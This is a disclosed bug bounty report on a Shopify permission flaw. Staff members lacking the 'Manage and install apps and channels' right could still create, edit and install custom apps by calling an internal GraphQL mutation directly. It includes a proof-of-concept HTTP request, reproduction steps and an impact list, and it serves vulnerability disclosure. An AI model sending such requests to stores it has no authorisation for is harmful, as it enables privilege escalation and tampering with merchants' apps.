# Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps

## Report Details
- **Report ID**: 1555502
- **URL**: https://hackerone.com/reports/1555502
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-04-30T22:25:14.636Z
- **Disclosed**: 2022-07-11T17:50:35.738Z

## Reporter
- **Username**: kun_19
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:

### Custom Apps - Permissions

The store owner, collaborators and staff members can create, edit and install custom apps for their shopify store. Therefor, these users need multiple permissions.  The permissions

* `View apps developed by staff and collaborators`
* `Develop apps` and
* `Manage and install apps and channels`

are  all needed. See also https://shopify.dev/apps/auth/admin-app-access-tokens#changing-api-scopes:

> Anyone with a staff or collaborator account on a store can change what store resources an admin-created custom app can access, but only if they have all the following permissions:
    * the Manage and install apps and channels permission and the Develop apps permission
    * the relevant permissions for the respective store resource

### Missing "Manage and install apps and channels" permission

If the `Manage and install apps and channels` permission is finally not granted to a user, custom apps can't be created, edited or installed. The staff user in F1712978 has for example the two permissions `View apps developed by staff and collaborators` and `Develop apps` but **not** the `Manage and install apps and channels` permission. Thus, he is not able to create, edit and install custom apps. He is also not even able to reach the relevant config section at https://<YOUR_STORE>/admin/apps/development  to manage custom apps:  

{F1712979}

Furthermore, the direct usage of the relevant API endpoints is also not possible. The request to create a custom app is not permitted and the server states that the user must have edit permissions for custom apps:

```
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: 19kun-19.myshopify.com
Cookie: <COOKIES_STAFF_MEMBER>
X-Csrf-Token: <CSRF_STAFF_MEMBER>
Origin: https://19kun-19.myshopify.com
...

{
   "operationName":"CreateAppMutation",
   "variables":{
      "input":{
         "title":"test",
         "maintainerUserId":"gid://shopify/StaffMember/76770345016"
      }
   },
   "query":"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\n  shopOwnedAppCreate(input: $input) {\n    app {\n      id\n      title\n      __typename\n    }\n    userErrors {\n      field\n      message\n      code\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```

```
HTTP/2 200 OK
Date: Sat, 30 Apr 2022 20:04:03 GMT
Content-Type: application/json; charset=utf-8
...

{
   "data":{
      "shopOwnedAppCreate":null
   },
   "errors":[
      {
         "message":"Access denied for shopOwnedAppCreate field. Required access: The user must have edit permissions for custom apps.",
         "locations":[
            {
               "line":2,
               "column":3
            }
         ],
         "path":[
            "shopOwnedAppCreate"
         ],
         "extensions":{
            "code":"ACCESS_DENIED",
            "documentation":"https:\/\/shopify.dev\/api\/usage\/access-scopes",
            "requiredAccess":"The user must have edit permissions for custom apps."
         }
      }
   ],
   ...
}
```

So far, so good, but if the store owner now decides to give the staff member only a permission to  **one specific** app (see F1712985), a problem occurs.
The staff member still have no access to the config section for managing the custom apps...  

{F1712990}  
{F1712991}

...but when using the API endpoints now directly, custom apps can be **created**, **edited** and **installed** by the staff member! The HTTP request above is now successful and the custom app could be created. This is definitely not intended. 

## Shops Used to Test:
https://19kun-19.myshopify.com

## Steps To Reproduce:

  1. As s store owner, enable the custom app development
  2. Make sure you added a staff member to your store and give him the two rights `View apps developed by staff and collaborators` and`Develop apps` **and** the permission for just **one** specific app (like in F1712985)
  3. Log in as staff member and visit https://<YOUR_STORE>/admin/apps/development (the config section for custom apps). You should see that you have no permissions to access this view (like in F1712991)
  4. Create a custom app by executing following request (replace the placeholders appropriately):  
```
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: <YOUR_STORE>
Cookie: <STAFF_MEMBER_COOKIE>
Content-Length: 428
Sec-Ch-Ua: "Chromium";v="93", " Not;A Brand";v="99"
X-Csrf-Token: <CSRF_TOKEN>
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Content-Type: application/json
Accept: application/json
X-Shopify-Web-Force-Proxy: 1
Sec-Ch-Ua-Platform: "Linux"
Origin: https://19kun-19.myshopify.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{
   "operationName":"CreateAppMutation",
   "variables":{
      "input":{
         "title":"Broken Access PoC",
         "maintainerUserId":"gid://shopify/StaffMember/<STAFF_MEMBER_ID>"
      }
   },
   "query":"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\n  shopOwnedAppCreate(input: $input) {\n    app {\n      id\n      title\n      __typename\n    }\n    userErrors {\n      field\n      message\n      code\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```
  5. Visit https://<YOUR_STORE>/admin/apps/development as a **store owner**. You should now observe the created custom app by the staff member:  
{F1713002}

**NOTE**: The other API endpoints related to the custom apps can also be used. Thus, after creating the custom app, the staff member is for example also able to edit the Admin API access scope and install the custom app.

## Impact

A shopify store owner / admin relies on the documentation and assumes that a staff member without the permission to `Manage and install apps and channels` is not able to create, edit or install custom apps. If the store owner / admin now grants a staff member the permission to only one app, the staff member (attacker) is able to

* create and install new custom apps with specific Admin API access scopes
* edit / modify existing custom apps of the store admin / other staff members, including
  * changing Admin API scopes (Integrity)
  * uninstalling the app (Availability)
  * uninstalling / reinstalling the app (which rotates the access keys) (Integrity + Availability)
  * etc.

## Attachments
- needed_permissions.png
- no_permission_dev_view.png
- permission_specific_app.png
- admin_apps.png
- no_permission_dev_view_2.png
- created_custom_app.png
